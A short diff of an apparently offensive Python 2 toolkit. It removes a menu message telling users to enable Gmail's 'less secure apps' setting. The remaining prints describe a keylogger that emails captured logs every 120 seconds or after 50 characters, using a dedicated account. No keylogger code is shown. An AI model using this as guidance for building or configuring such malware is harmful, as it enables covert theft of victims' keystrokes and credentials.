@@ -117,7 +117,6 @@ def main():
                 raise SystemExit
             if choice.upper() == 'K':
                 option()
-                print '\n {0}WARNING: Enable access to less secure apps on your email account.{2}  \n -> * ONLY WORK WITH GMAIL * :\n {1}https://www.google.com/settings/security/lesssecureapps{2}'.format(RED, GREEN, END)
                 print '\n NOTE: Don\'t use your personal email, make a dedicated.'
                 print '\n {0}This keylogger send logs when logs > 50 chars or each 120 seconds.{1}'.format(BLUE, END)
             if choice.upper() == '6':
